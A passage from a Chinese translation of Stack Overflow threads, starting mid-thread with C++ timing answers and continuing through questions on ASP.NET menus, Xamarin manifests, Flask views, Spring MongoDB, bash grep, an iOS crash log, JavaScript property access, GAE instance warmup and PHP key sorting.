> 赞同：27
> 
> 时间：2016-05-07T17:50:50.997

使用`std::chrono`：

```
#include <chrono>
#include <thread>
#include <iostream>

// There are other clocks, but this is usually the one you want.
// It corresponds to CLOCK_MONOTONIC at the syscall level.
using Clock = std::chrono::steady_clock;
using std::chrono::time_point;
using std::chrono::duration_cast;
using std::chrono::milliseconds;
using namespace std::literals::chrono_literals;
using std::this_thread::sleep_for;

int main()
{
    time_point<Clock> start = Clock::now();
    sleep_for(500ms);
    time_point<Clock> end = Clock::now();
    milliseconds diff = duration_cast<milliseconds>(end - start);
    std::cout << diff.count() << "ms" << std::endl;
} 
```

`std::chrono`是 C++11，`std::literals`是 C++14（否则你需要`milliseconds(500)`）。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-02-26T15:25:19.250

原来在 boost 1.46 中有一个时间版本（只是在不同的位置）。感谢@jogojapan 指出。

可以这样做：

```
#include <boost/timer.hpp>

timer t;
<some stuff>
std::cout << t.elapsed() << std::endl; 
```

或者像@Quentin Perez 指出的那样使用 std 库（我会按照最初的要求接受）

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2016-01-05T21:15:57.890

基于 Quentin Perez 的解决方案，您可以使用 std::function 和 lambda 将任意函数传递给时间。

```
#include <ctime>
#include <iostream>
#include <functional>

void timeit(std::function<void()> func) {
    std::clock_t start = std::clock();

    func();

    int ms = (std::clock() - start) / (double) (CLOCKS_PER_SEC / 1000);

    std::cout << "Finished in " << ms << "ms" << std::endl;
}

int main() {
    timeit([] {
        for (int i = 0; i < 10; ++i) {
            std::cout << "i = " << i << std::endl;
        } 
    });

    return 0;
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-26T15:26:52.047

您可以使用 long 来保存当前时间值作为起始值，然后将当前时间转换为 double。这是一些用作示例的代码段。

```
#include <iostream>
#include <stdlib.h>
#include <time.h>
#include <sys/types.h>
#include <sys/timeb.h>
int main()
{

struct      _timeb tStruct;
double      thisTime;
bool        done = false;
long        startTime;

 struct _timeb
 {
 int   dstflag;   // holds a non-zero value if daylight saving time is in effect
 long  millitm;   // time in milliseconds since the last one-second hack
 long  time;      // time in seconds since 00:00:00 1/1/1970
 long  timezone;  // difference in minutes moving west from UTC

 };

  _ftime(&tStruct); // Get start time

thisTime = tStruct.time + (((double)(tStruct.millitm)) / 1000.0); // Convert to double
startTime = thisTime;                                             // Set the starting time (when the function begins)

while(!done)     // Start an eternal loop
    {
    system("cls");  // Clear the screen
    _ftime(&tStruct);    // Get the current time
    thisTime = tStruct.time + (((double)(tStruct.millitm)) / 1000.0); // Convert to double
    // Check for 5 second interval to print status to screen
    cout << thisTime-startTime; // Print it. 

    }
} 
```

# asp.net - 移动鼠标时关闭 ASP 菜单

> ID：15092510
> 
> 赞同：1
> 
> 时间：2013-02-26T15:08:52.387
> 
> 标签：asp.net, .net-3.5, aspmenu

我正在处理一个具有 ASP 菜单 () 的项目，我无法关闭它。我想要它做的就是在鼠标没有悬停时折叠它。有什么设置或什么可以解决这个问题吗？也许是一个简单的问题，但我到处搜索都没有运气。

我可以很好地展开菜单，当我移动到不同的节点时，它会切换到那个。问题是当我将鼠标移到整个菜单之外时，它保持打开状态。不应该有一些简单的设置吗？我真的必须跳过几圈 javascript 和事件来解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:47:38.630

默认情况下，菜单应在光标离开时立即折叠。剥离所有 css 并用简单的代码对其进行测试。

![在此处输入图像描述](../Images/1f46840b2deaaa78376e6af4332cbd47.png)

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="MenuTest.aspx.cs" Inherits="WebApplication2012.MenuTest" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <asp:Menu runat="server" DataSourceID="MenuDataSource"></asp:Menu>
        <asp:SiteMapDataSource ID="MenuDataSource" runat="server" ShowStartingNode="false"
            SiteMapProvider="XmlSiteMapProvider" />
    </form>
</body>
</html>

// MenuTest.sitemap
<?xml version="1.0" encoding="utf-8" ?>
<siteMap xmlns="http://schemas.microsoft.com/AspNet/SiteMap-File-1.0" >
    <siteMapNode url="Home" title="Home"  description="Home">
        <siteMapNode url="Monday" title="One"  description="One" >
          <siteMapNode url="Monday - One" title="Monday - One" description="Monday - One" />
          <siteMapNode url="Monday - Two" title="Monday - Two" description="Monday - Two" />
          <siteMapNode url="Monday - Three" title="Monday - Three" description="Monday - Three" />
        </siteMapNode>
        <siteMapNode url="Tuesday" title="Tuesday"  description="Tuesday" />
    </siteMapNode>
</siteMap>

// web.config    
<system.web>
  ...
  <siteMap defaultProvider="XmlSiteMapProvider">
    <providers>
      <add name="XmlSiteMapProvider" type="System.Web.XmlSiteMapProvider" siteMapFile="~/MenuTest.sitemap" />
    </providers>
  </siteMap>
</system.web> 
```

# android - 调试弹出窗口“缺少清单？”

> ID：15092513
> 
> 赞同：0
> 
> 时间：2013-02-26T15:08:58.257
> 
> 标签：android, xamarin.android, android-manifest, xamarin

我收到此错误消息。我创建了一个新项目并点击调试来测试它。我什么都没加，我收到了这个弹出消息。我的问题可能是什么？我可以创建一个新的空白项目，其中包含控制器和模型项目，它可以很好地调试。但我需要使用提供给我的这个解决方案。

单声道机器人的新手将不胜感激。

![在此处输入图像描述](../Images/de14193b66fffec2712ce5548b520ef7.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T16:43:23.303

> 我的问题可能是什么？

您正在使用 Visual Studio... Android 与 Eclipse 配合得更好。

开个玩笑，每个 Android 应用程序都需要一个[`AndroidManifest.xml`](http://developer.android.com/guide/topics/manifest/manifest-intro.html)文件。看起来您正在使用 MonoDroid，并且有关于创建清单文件的文档[。](http://docs.xamarin.com/guides/android/advanced_topics/working_with_androidmanifest.xml)

另外，请确保您已经构建了项目。

> AndroidManifest.xml 作为构建过程的一部分生成，在 Properties\AndroidManifest.xml 中找到的 XML 与基于自定义属性生成的 XML 合并。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T19:16:26.317

您的问题可能是没有任何项目被设置为部署到设备。

`Solution > Properties > Configuration Properties > Tick The Deploy checkbox`如果还没有，请右键单击您的应用程序项目。

还要确保用 标记您的一个活动`MainLauncher = true`，否则 Android 不知道首先启动哪个活动。这是在`[Activity()]`属性中完成的，如下所示：

```
[Activity(Label = "Epic Activity", MainLauncher = true, Icon = "@drawable/icon")]
public class Activity1 : Activity {} 
```

# python-2.7 - 如何将值传递给可插入视图？

> ID：15092515
> 
> 赞同：2
> 
> 时间：2013-02-26T15:09:09.747
> 
> 标签：python-2.7, flask

我正在尝试实现一个模板，用于添加带有可插入视图的 VIEW、ADD 和 EDIT 网页。如何使用 url 值？

这是我试图翻译成可插入视图的代码。

```
@app.route('/edit/category/<category>', methods=['GET', 'POST'])
def editCategory(category):
    form = forms.AddCategory()
    form.name.data = category
    if form.validate_on_submit():
        newName = form.name.data
        database.editCategory(name = category, newName = newName)
        #view single category?
        return redirect('/view/categories/')
    return render_template('edit-category.html', category = category, form = form) 
```

可插拔查看代码

```
class ListView(View):

    def getTemplate_name(self):
        raise NotImplementedError()

    def render_template(self, context):
        return render_template(self.get_template_name(), **context)

    def dispatch_request(self):
        context = self.get_context()
        return self.render_template(context)

class CategoryView(ListView):

    def get_template_name(self):
        return 'categories.html'

    def get_objects(self):
        return models.Category.query.all()

    def get_form(self):
        return forms.AddCategory()

    def get_context(self):
        return {'categories': self.get_objects(), 'form': self.get_form()}

app.add_url_rule('/view/categories', view_func=CategoryView.as_view('category'))

class EditCategory(ListView):

    def get_template_name(self):
        return 'edit-category.html'

    def get_form(self, category):
        form = forms.AddCategory()
        form.name.data = category
        return form

    def get_context(self):
        return {'form': self.get_form()}

app.add_url_rule('/edit/category/<category>', view_func=EditCategory.as_view('category')) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-25T10:59:47.990

您需要覆盖类中的`dispatch_request`方法，`EditCategory`因为此方法具有传递给它的 url 值。

```
class EditCategory(View):

    ...

    def get_context(self, category):
        return {'form': self.get_form(category)}

    def dispatch_request(self, category):
        context = self.get_context(category)
        return self.render_template(context)

app.add_url_rule('/edit/category/<category>', view_func=EditCategory.as_view('category')) 
```

`viewCategory`顺便说一句，我认为在这种情况下，您最好使用原始的装饰视图功能，因为and`editCategory`功能之间几乎没有共性

# java - MongoDb 不保存 Spring 应用程序的 Java POJO 部分

> ID：15092517
> 
> 赞同：0
> 
> 时间：2013-02-26T15:09:13.097
> 
> 标签：java, spring, mongodb

我正在制作的应用程序中有以下 Java Pojo 部分：

```
@Document
public class Resume implements ResumePlan,Serializable {

    private static final long serialVersionUID = -5332235643191283709L;

    @Id
    private String id;
    @Autowired(required=false)
    private Objective objective;
    @Autowired
    private PersonalDetails personalDetails;
    @Autowired
    private Skills skills;
    @Autowired(required=false)
    private Experience experience;
    @Autowired
    private Education education;
    @Autowired(required=false)
    private References references;
    @Autowired(required=false)
    private Publications publications;
} 
```

我通过以下代码保存它：

```
mongoOperations.insert(resume); 
```

当我在 mongodb 控制台中检查后端时：正在存储以下内容：

> db.resume.find(); {“_id”：“test@abc.com+919876543210”，“_class”：“com.springmyresume.resume.Resume”}

它不存储其余的 bean 对象，例如 PersonalDetails 等。

有人可以告诉我我在这里做错了什么。

*解决了。我做了以下更改。1) 删除了@Autowired 注释 2) 添加了@DBRef 注释 使用@Autowired 注释字段对象没有得到保存。我不知道为什么这是这种行为。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:41:31.893

首先，请确保您已将所有必要字段的类 ( `Objective`, `PersonalDetails`) 注释为`@Document`.

其次，请为字段对象提供 getter 和 setter。

另请确保您已指定实际`@Id`，否则 spring 会为您完成。

顺便说一句，如果你不想使用嵌入，你可以使用`@DBRef`注释。这里有很好的信息：

[http://maciejwalkowiak.pl/blog/2012/04/30/spring-data-mongodb-cascade-save-on-dbref-objects/](http://maciejwalkowiak.pl/blog/2012/04/30/spring-data-mongodb-cascade-save-on-dbref-objects/)

# android - Android 通知 - 我应该为我的应用选择哪种方式？

> ID：15092518
> 
> 赞同：-1
> 
> 时间：2013-02-26T15:09:14.040
> 
> 标签：android, eclipse, notifications

我的应用程序就像 Facebook。每个用户都有一个朋友列表。用户可以发布状态并且用户的朋友应该立即得到通知。
在做了一些研究后，我发现大多数人推荐使用 GCM。我不知道我是否应该走那条路。首先，我明白我需要访问网络资源？我真的不知道这是什么意思，有人可以解释一下吗？其次，我意识到用户有很多条款，比如他们应该有一个谷歌帐户和 Android 2.2 或更高版本。所有这些不是一个大问题吗？
我对 GCM 的最大问题是我对这类事情不熟悉，我认为我无法处理它。也许有人可以给我一个很好的教程？因为Android教程并没有真正帮助我。
如果我不选择 GCM，还有另一种好方法，并且可能很容易发送那种通知 - 实时，当数据库发生变化时？有人可以给我看一个教程吗？

非常感谢，这对我很重要。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:17:04.793

[http://www.androidhive.info/2012/10/android-push-notifications-using-google-cloud-messaging-gcm-php-and-mysql/](http://www.androidhive.info/2012/10/android-push-notifications-using-google-cloud-messaging-gcm-php-and-mysql/)

我喜欢这个教程希望它会有所帮助。

# regex - Bash 正则表达式匹配数字

> ID：15092521
> 
> 赞同：1
> 
> 时间：2013-02-26T15:09:26.823
> 
> 标签：regex, bash

我试图只匹配这种格式的文本文件中的数字：

```
> 1234 
```

我正在循环运行文件。每一行都在`$i`

```
$i | grep "\d{4}" 
```

输出如下所示：

```
>
1234
>
5678 
```

为什么它仍然输出`>`？我想删除那些。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:39:39.907

从`man grep`

> ```
>  -o, --only-matching
>           Print only the matched (non-empty) parts of a matching line, with each such part on a
>           separate output line. 
> ```

尝试`grep -o ....`

测试：

```
i="> 1234"
$ echo "$i"
> 1234
$ echo "$i" | grep -oP "\d{4}"
1234 
```

# iphone - 未知异常和崩溃

> ID：15092522
> 
> 赞同：4
> 
> 时间：2013-02-26T15:09:31.040
> 
> 标签：iphone, ios, objective-c, crash, crash-reports

当我尝试快速滚动表格视图或从远程重新加载数据时，我的应用程序崩溃了。当我让远程获取首先发生然后滚动表格视图时，一切似乎都工作正常。我不知道下面的崩溃日志是什么意思。它有时工作正常，有时会崩溃。

```
Incident Identifier: 710A120C-97E3-45C8-A7B2-E6A7BD98BC1A
CrashReporter Key:   8bd54d8428128b9e6b8c04d59b86c40cccf33457
Hardware Model:      iPhone5,2
Process:         MyApp [5294]
Path:            /var/mobile/Applications/B6ED5B19-B8D7-4146-90A2-F709AE35292F/MyApp.app/MyApp
Identifier:      MyApp
Version:         ??? (???)
Code Type:       ARM (Native)
Parent Process:  launchd [1]

Date/Time:       2013-02-26 16:45:27.693 +0200
OS Version:      iOS 6.1.2 (10B146)
Report Version:  104

Exception Type:  EXC_CRASH (SIGSEGV)
Exception Codes: 0x0000000000000000, 0x0000000000000000
Crashed Thread:  1

Thread 0 name:  Dispatch queue: com.apple.main-thread
Thread 0:
0   libobjc.A.dylib                 0x3c3f658a _cache_getImp + 10
1   libobjc.A.dylib                 0x3c3f6fa0 lookUpMethod + 24
2   libobjc.A.dylib                 0x3c3f81e2 class_respondsToSelector + 26
3   CoreFoundation                  0x3470a750 objectIsKindOfClass + 32
4   CoreFoundation                  0x3470a49c __handleUncaughtException + 64
5   libobjc.A.dylib                 0x3c3fba46 _objc_terminate() + 126
6   libc++abi.dylib                 0x3be48118 safe_handler_caller(void (*)()) + 76
7   libc++abi.dylib                 0x3be481b0 std::terminate() + 16
8   libc++abi.dylib                 0x3be49626 __cxa_rethrow + 90
9   libobjc.A.dylib                 0x3c3fb9b0 objc_exception_rethrow + 8
10  CoreFoundation                  0x3465129c CFRunLoopRunSpecific + 452
11  CoreFoundation                  0x346510c4 CFRunLoopRunInMode + 100
12  GraphicsServices                0x3822f336 GSEventRunModal + 70
13  UIKit                           0x3656d2b4 UIApplicationMain + 1116
14  MyApp                       0x000910a2 0x44000 + 315554
15  MyApp                       0x0004668c 0x44000 + 9868

Thread 1 name:  Dispatch queue: com.apple.libdispatch-manager
Thread 1 Crashed:
0   libsystem_kernel.dylib          0x3c8df5d0 kevent64 + 24
1   libdispatch.dylib               0x3c81ad22 _dispatch_mgr_invoke + 806
2   libdispatch.dylib               0x3c816374 _dispatch_mgr_thread + 32

Thread 2 name:  WebThread
Thread 2:
0   libsystem_kernel.dylib          0x3c8dee30 mach_msg_trap + 20
1   libsystem_kernel.dylib          0x3c8defd0 mach_msg + 48
2   CoreFoundation                  0x346df2b6 __CFRunLoopServiceMachPort + 126
3   CoreFoundation                  0x346de02c __CFRunLoopRun + 900
4   CoreFoundation                  0x34651238 CFRunLoopRunSpecific + 352
5   CoreFoundation                  0x346510c4 CFRunLoopRunInMode + 100
6   WebCore                         0x3a650390 RunWebThread(void*) + 440
7   libsystem_c.dylib               0x3c8480de _pthread_start + 306
8   libsystem_c.dylib               0x3c847fa4 thread_start + 4

Thread 3 name:  com.apple.NSURLConnectionLoader
Thread 3:
0   libsystem_kernel.dylib          0x3c8dee30 mach_msg_trap + 20
1   libsystem_kernel.dylib          0x3c8defd0 mach_msg + 48
2   CoreFoundation                  0x346df2b6 __CFRunLoopServiceMachPort + 126
3   CoreFoundation                  0x346de02c __CFRunLoopRun + 900
4   CoreFoundation                  0x34651238 CFRunLoopRunSpecific + 352
5   CoreFoundation                  0x346510c4 CFRunLoopRunInMode + 100
6   Foundation                      0x34f9e888 +[NSURLConnection(Loader) _resourceLoadLoop:] + 304
7   Foundation                      0x3502222c __NSThread__main__ + 968
8   libsystem_c.dylib               0x3c8480de _pthread_start + 306
9   libsystem_c.dylib               0x3c847fa4 thread_start + 4

Thread 4:
0   libsystem_kernel.dylib          0x3c8efd98 __workq_kernreturn + 8
1   libsystem_c.dylib               0x3c83dad6 _pthread_workq_return + 14
2   libsystem_c.dylib               0x3c83d7f2 _pthread_wqthread + 362
3   libsystem_c.dylib               0x3c83d680 start_wqthread + 4

Thread 5:
0   libsystem_kernel.dylib          0x3c8dee30 mach_msg_trap + 20
1   libsystem_kernel.dylib          0x3c8defd0 mach_msg + 48
2   CoreFoundation                  0x346df2b6 __CFRunLoopServiceMachPort + 126
3   CoreFoundation                  0x346de02c __CFRunLoopRun + 900
4   CoreFoundation                  0x34651238 CFRunLoopRunSpecific + 352
5   CoreFoundation                  0x346510c4 CFRunLoopRunInMode + 100
6   Foundation                      0x34f755be -[NSRunLoop(NSRunLoop) runMode:beforeDate:] + 250
7   Foundation                      0x35018c40 -[NSRunLoop(NSRunLoop) run] + 76
8   MyApp                       0x0016b900 0x44000 + 1210624
9   Foundation                      0x3502222c __NSThread__main__ + 968
10  libsystem_c.dylib               0x3c8480de _pthread_start + 306
11  libsystem_c.dylib               0x3c847fa4 thread_start + 4

Thread 6:
0   libsystem_kernel.dylib          0x3c8dee30 mach_msg_trap + 20
1   libsystem_kernel.dylib          0x3c8defd0 mach_msg + 48
2   CoreFoundation                  0x346df2b6 __CFRunLoopServiceMachPort + 126
3   CoreFoundation                  0x346de02c __CFRunLoopRun + 900
4   CoreFoundation                  0x34651238 CFRunLoopRunSpecific + 352
5   CoreFoundation                  0x346510c4 CFRunLoopRunInMode + 100
6   Foundation                      0x34f755be -[NSRunLoop(NSRunLoop) runMode:beforeDate:] + 250
7   Foundation                      0x35018c40 -[NSRunLoop(NSRunLoop) run] + 76
8   MyApp                       0x000e63d0 0x44000 + 664528
9   Foundation                      0x3502222c __NSThread__main__ + 968
10  libsystem_c.dylib               0x3c8480de _pthread_start + 306
11  libsystem_c.dylib               0x3c847fa4 thread_start + 4

Thread 7 name:  com.apple.CFSocket.private
Thread 7:
0   libsystem_kernel.dylib          0x3c8ef594 __select + 20
1   CoreFoundation                  0x346e3474 __CFSocketManager + 676
2   libsystem_c.dylib               0x3c8480de _pthread_start + 306
3   libsystem_c.dylib               0x3c847fa4 thread_start + 4

Thread 8:
0   libsystem_kernel.dylib          0x3c8dee30 mach_msg_trap + 20
1   libsystem_kernel.dylib          0x3c8defd0 mach_msg + 48
2   CoreFoundation                  0x346df2b6 __CFRunLoopServiceMachPort + 126
3   CoreFoundation                  0x346de02c __CFRunLoopRun + 900
4   CoreFoundation                  0x34651238 CFRunLoopRunSpecific + 352
5   CoreFoundation                  0x346afc46 CFRunLoopRun + 94
6   MyApp                       0x00115d7e 0x44000 + 859518
7   Foundation                      0x3502222c __NSThread__main__ + 968
8   libsystem_c.dylib               0x3c8480de _pthread_start + 306
9   libsystem_c.dylib               0x3c847fa4 thread_start + 4

Thread 9:
0   libsystem_kernel.dylib          0x3c8efd98 __workq_kernreturn + 8
1   libsystem_c.dylib               0x3c83dad6 _pthread_workq_return + 14
2   libsystem_c.dylib               0x3c83d7f2 _pthread_wqthread + 362
3   libsystem_c.dylib               0x3c83d680 start_wqthread + 4

Thread 10:
0   libsystem_kernel.dylib          0x3c8efd98 __workq_kernreturn + 8
1   libsystem_c.dylib               0x3c83dad6 _pthread_workq_return + 14
2   libsystem_c.dylib               0x3c83d7f2 _pthread_wqthread + 362
3   libsystem_c.dylib               0x3c83d680 start_wqthread + 4

Thread 11 name:  JavaScriptCore::BlockFree
Thread 11:
0   libsystem_kernel.dylib          0x3c8ef08c __psynch_cvwait + 24
1   libsystem_c.dylib               0x3c840afc _pthread_cond_wait + 644
2   libsystem_c.dylib               0x3c840870 pthread_cond_timedwait + 40
3   JavaScriptCore                  0x38625df6 WTF::ThreadCondition::timedWait(WTF::Mutex&, double) + 102
4   JavaScriptCore                  0x38738532 JSC::BlockAllocator::blockFreeingThreadMain() + 78
5   JavaScriptCore                  0x3874b030 WTF::wtfThreadEntryPoint(void*) + 12
6   libsystem_c.dylib               0x3c8480de _pthread_start + 306
7   libsystem_c.dylib               0x3c847fa4 thread_start + 4

Thread 12 name:  JavaScriptCore::Marking
Thread 12:
0   libsystem_kernel.dylib          0x3c8ef08c __psynch_cvwait + 24
1   libsystem_c.dylib               0x3c840afc _pthread_cond_wait + 644
2   libsystem_c.dylib               0x3c84acf8 pthread_cond_wait + 36
3   JavaScriptCore                  0x386cb6dc JSC::SlotVisitor::drainFromShared(JSC::SlotVisitor::SharedDrainMode) + 140
4   JavaScriptCore                  0x386cb620 JSC::MarkStackThreadSharedData::markingThreadMain() + 140
5   JavaScriptCore                  0x3874b030 WTF::wtfThreadEntryPoint(void*) + 12
6   libsystem_c.dylib               0x3c8480de _pthread_start + 306
7   libsystem_c.dylib               0x3c847fa4 thread_start + 4

Thread 13 name:  WebCore: CFNetwork Loader
Thread 13:
0   libsystem_kernel.dylib          0x3c8dee30 mach_msg_trap + 20
1   libsystem_kernel.dylib          0x3c8defd0 mach_msg + 48
2   CoreFoundation                  0x346df2b6 __CFRunLoopServiceMachPort + 126
3   CoreFoundation                  0x346de02c __CFRunLoopRun + 900
4   CoreFoundation                  0x34651238 CFRunLoopRunSpecific + 352
5   CoreFoundation                  0x346510c4 CFRunLoopRunInMode + 100
6   WebCore                         0x3a6eaccc WebCore::runLoaderThread(void*) + 140
7   JavaScriptCore                  0x3874b030 WTF::wtfThreadEntryPoint(void*) + 12
8   libsystem_c.dylib               0x3c8480de _pthread_start + 306
9   libsystem_c.dylib               0x3c847fa4 thread_start + 4

Thread 14:
0   libsystem_kernel.dylib          0x3c8efd98 __workq_kernreturn + 8
1   libsystem_c.dylib               0x3c83dad6 _pthread_workq_return + 14
2   libsystem_c.dylib               0x3c83d7f2 _pthread_wqthread + 362
3   libsystem_c.dylib               0x3c83d680 start_wqthread + 4

Thread 1 crashed with ARM Thread State (32-bit):
    r0: 0x00000004    r1: 0x00000000      r2: 0x00000000      r3: 0x0042c714
    r4: 0x00000001    r5: 0x00000000      r6: 0x0042c744      r7: 0x0042c764
    r8: 0x00000000    r9: 0x0042c6c8     r10: 0x3e3a2188     r11: 0x00000002
    ip: 0x00000171    sp: 0x0042c6d0      lr: 0x3c81ad27      pc: 0x3c8df5d0
  cpsr: 0x60000010 
```

如果有人能向我解释这个崩溃日志可能与什么相关以及我如何解决它，我会非常高兴。非常感谢所有愿意帮助他人的人。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:51:50.380

在我看来，它是悬空指针，您正在向它发送消息。正如 MikeD 所说，如果有帮助，请在异常上使用断点。但它不是 100% 可靠的，因为您获得的是 SIGSEGV 而不是 SIGABRT。并且异常抛出并不是真正的崩溃原因，只是一个边框效果。

编辑

好的：在您的日志崩溃中，它说 libsystem_kernel.dylib 在 kevent 调用中崩溃了。这对您没有帮助，因为这是私有且不透明的，您可以 100% 确定这个库能很好地完成它的工作。这可能是因为您（无意中）使用了不应写入的空间内存。就像悬空指针一样。假设您已将内存分配给 0x2000，并且您有一个指向该内存的指针，如果您释放了内存但仍使用此指针指向该地址，如果其他人（如 libsystem_kernel）使用它，并且您更改了相同的一些数据时间（因为你的悬空指针）。然后对方将使用损坏的数据，并且会发生一些随机行为。这就是为什么如果你从字面上分析你的崩溃日志，你会做出错误的陈述。因为来自 libSystem 的 kevent 是稳定的。

顺便说一句，你有线程 1 崩溃了，但查看线程 0，它也试图引发异常，但它没有时间去做。这也可能由于数据损坏而发生。

这就是为什么我建议你再做一次崩溃，并将其与这次比较。如果崩溃日志相同，那么我完全错了。如果崩溃日志不同，则这是一个悬空指针。

# javascript - Ajax 可以在加载时返回资源吗？

> ID：15092533
> 
> 赞同：2
> 
> 时间：2013-02-26T15:10:30.987
> 
> 标签：javascript, ajax, xmlhttprequest, comet

使用[XMLHttpRequest](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest)，我可以动态检索页面/文件：

```
var request = new XMLHttpRequest();
request.onload = function() {
  console.log(this.responseText);
};
request.open("get", "/my_file.txt", true);
request.send(); 
```

但是，`onload`回调仅在下载整个页面时运行。在加载页面时，没有任何方法可以逐位返回页面。这意味着在`XMLHttpRequest`完全加载之前无法访问大文件。

JavaScript 是否能够在动态加载文件时检索文件的内容（通过 HTTP **1.0发送）？**

# javascript - 对于...在 javascript 中使用自定义对象

> ID：15092534
> 
> 赞同：2
> 
> 时间：2013-02-26T15:10:31.210
> 
> 标签：javascript

```
function doIt()
{
    var person={firstname:"John", lastname:"Smith", age:"25"};
    var x;
    var txt="";
    for (x in person)
    {
        txt=txt+person[x] +"<br>";
    }
    document.getElementById("showtext").innerHTML=txt;
} 
```

我的问题是：为什么当我更换

```
txt=txt+person[x]+"<br>"; 
```

和：

```
txt=txt+person.x+"<br>"; 
```

person.x 的值返回为未定义？在循环的第一次迭代中，x 应该是“名字”。所以 person.x 应该等于 person.firstname，因此返回值 John。我很想了解为什么它会返回“未定义”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:12:15.290

答案是：

由于**x**不是**属性名称**，并且对象没有名称/键**x**的属性。

> 人.x

未定义。

这相当于

> person[ **"x"** ] *（细微的差别在于双引号）*

什么也是未定义的。

要使其与点符号一起使用，您必须编写：

```
 eval("person." + x); // but this is evil 
 // Tested on win7 with chrome 45+ 
```

> 所以表达式**eval("person." + x)**将在第一次运行时扩展为**eval("person.firstname" )**，它返回**"John"**
> ...

我不推荐什么，因为**eval**可能会引入安全问题。

**更新 1**

> **免责声明：** 有了这个答案，我只回答了最初的问题，并试图解释问题。对于*“// but this is evil”*，我建议不要使用这种方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-26T15:13:44.203

在第一种情况下，您使用“括号表示法”，其中变量的值`x`用于确定属性名称。

在第二种情况下，您使用“点表示法”，其中查找的属性实际上称为`x`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-26T15:13:16.263

当你写的时候`person[x]`，它的意思是“查找 的值`x`，然后在里面找到那个元素`person`”。当你写`person.x`它的时候，它的意思是“查找`x`人的内在价值”。

`person`没有`x`元素，所以你没有定义。你真的只是想要`person[x]`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T15:13:30.423

x 将是一个字符串。例如“人”，所以你必须使用 [] 括号

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-26T15:13:35.577

您不能将点表示法与变量键一起使用。它将查找未定义的属性“x”。person[x] 是正确的方法。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-26T15:16:17.633

如果您使用方括号语法，Javascript 将允许您使用变量访问对象的属性。因此，只要 x 包含表示属性名称的字符串， person[x] 就会执行您尝试执行的操作。语法结构 person.x 等价于 person["x"]。

# java - 在 GAE 中实现一致的响应时间？

> ID：15092537
> 
> 赞同：2
> 
> 时间：2013-02-26T15:10:35.910
> 
> 标签：java, python, performance, google-app-engine, load-testing

在对我的应用程序运行负载测试时，我看到了非常一致的响应时间。一旦 GAE 上的负载水平恒定，平均响应时间就会越来越小。**但我希望在每秒接收的请求少得多的其他应用程序上保持相同的一致性。在那些我永远不需要支持超过〜3个请求/秒。**

**[阅读文档](https://developers.google.com/appengine/docs/adminconsole/performancesettings#scheduler)让我认为增加最小空闲实例的数量应该会导致更一致的响应时间**。但即便如此，客户端仍然会看到更长的响应时间，每次 GAE 的调度程序认为需要更多实例时。我正在寻找用户看不到那些初始缓慢请求的设置。

当我将最小空闲实例数增加到 1 时，我希望 GAE 仅使用一个常驻实例。随着负载的增加，它应该启动并预热新的（动态）实例。[只有在它们预热后](https://developers.google.com/appengine/docs/adminconsole/instances#Warmup_Requests)，GAE 才会向它们发送请求。**但是从响应时间来看，似乎客户端请求在被提出时以动态实例的形式到达。因此，这些请求需要很长时间（最多 30 秒）。**

*   **如果我的预热代码不完整，会发生这种情况吗？**
*   **对动态实例的第一次调用是否会因为涉及尚未预热的代码路径而如此缓慢？**

在负载测试期间或当有足够多的人使用该应用程序时，我没有遇到此问题。但是当没有人使用该应用程序时，例如早上，我的测试环境实际上无法被客户使用。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T16:23:20.903

一些通用的想法：

*   实例的 30 秒启动时间似乎非常多。我们做了很多初始化（包括数据库命中），我们有大约 5 秒的开销。
*   不保证预热请求。如果所有实例都忙，并且调度程序认为如果它启动一个新实例而不是在一个忙的实例上排队，请求将得到更快的响应，它会这样做*而不会*浪费时间进行预热请求
*   我不认为这是冷代码路径的问题（尽管我不详细了解java的热点），它可能是需要先填充的（mem-）缓存
*   我不知道您所说的“不完整的预热代码”是什么意思；只需检查您的日志以获取对 /_ah/warmup 的请求 - 如果有的话，预热请求已启用并正在工作。
*   将空闲实例的数量增加到超过 1 个实例标记可能在这里无济于事。

可悲的是，没有任何通用技巧可以避免这种情况，但您可以尝试

*   延迟初始化代码（仅执行绝对需要的最小实例启动开销）
*   启动一个保持（mem-）缓存热的后端

如果您不介意成本（并且不需要为您的小容量应用程序自动扩展），您甚至可以让所有请求都由永远在线的后端提供服务

# php - PHP 值在负数之前和数字之后

> ID：15092541
> 
> 赞同：-1
> 
> 时间：2013-02-26T15:10:48.510
> 
> 标签：php, arrays

这可能没有多大意义。我想知道是否有任何值可以放入数组中并对其进行排序，它会出现在所有负条目之前或所有正条目之后。

```
 $keys = array('m1' => 1, -500 => 1, 0 => 1, 1000 => 1, 'm' => 1, 5000 => 1, );

    foreach($keys as $k => $v){
    echo $k . '<br />';
} 
```

退货

```
 -500
  m
  0
  m1
  1000
  5000 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:56:07.380

```
<?

$keys = array('m1' => 1, -500 => 1, 0 => 1, 1000 => 1, 'm2' => 1, 5000 => 1, );

ksort($keys, SORT_STRING);

foreach($keys as $k => $v){
    echo $k . '<br />';
}

?> 
```

将返回：

```
-500
0
1000
5000
m1
m2 
```

